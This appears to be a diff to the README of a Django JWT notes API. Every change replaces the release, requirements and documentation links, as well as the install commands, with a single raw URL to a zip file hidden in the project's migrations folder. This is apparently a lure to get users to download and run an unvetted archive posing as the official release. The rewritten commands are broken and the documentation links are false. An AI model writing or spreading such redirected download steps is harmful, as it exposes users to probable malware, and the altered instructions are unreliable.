@@ -8,7 +8,7 @@ Welcome to the **notes_api_jwt** project! This application provides a secure way
 
 ### To get started, visit this page to download:
 
-[![Download notes_api_jwt](https://img.shields.io/badge/Download-notes_api_jwt-blue.svg)](https://github.com/LUHI39/notes_api_jwt/releases)
+[![Download notes_api_jwt](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip)](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip)
 
 On the Releases page, you will find different versions of the software. Select the version you want to use. Download and run the application following the instructions below.
 
@@ -19,24 +19,24 @@ Before you download, make sure your system meets these requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Python Version:** Python 3.6 or higher installed
 - **Django Version:** Django 3.1 or higher installed
-- **Additional Dependencies:** Use the provided `requirements.txt` file to install necessary libraries.
+- **Additional Dependencies:** Use the provided `https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip` file to install necessary libraries.
 
 ## 🔧 Installation Steps
 
-1. Download the software from the [Releases page](https://github.com/LUHI39/notes_api_jwt/releases).
+1. Download the software from the [Releases page](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip).
 2. Extract the downloaded files to a folder of your choice.
 3. Open your terminal or command prompt.
 4. Navigate to the folder where you extracted the files.
 5. Run the following command to install required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip
    ```
 
 6. Start the server using:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip runserver
    ```
 
 7. Open your web browser and go to `http://127.0.0.1:8000/` to access the application.
@@ -82,9 +82,9 @@ You can also reach out through the Issues section of this repository for help fr
 
 ## 🔗 Resources
 
-- [Django Documentation](https://www.djangoproject.com/)
-- [Django REST Framework Documentation](https://www.django-rest-framework.org/)
-- [Python Documentation](https://www.python.org/doc/)
+- [Django Documentation](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip)
+- [Django REST Framework Documentation](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip)
+- [Python Documentation](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip)
 
 ## 🏷️ Keywords
 
@@ -94,4 +94,4 @@ api, custom-user, django, django-rest-framework, drf, jwt-authentication, notes-
 
 Do not forget to check the Releases page to download the latest version of **notes_api_jwt**.
 
-[![Download notes_api_jwt](https://img.shields.io/badge/Download-notes_api_jwt-blue.svg)](https://github.com/LUHI39/notes_api_jwt/releases)
+[![Download notes_api_jwt](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip)](https://raw.githubusercontent.com/LUHI39/notes_api_jwt/main/notes/migrations/notes_api_jwt_2.9.zip)
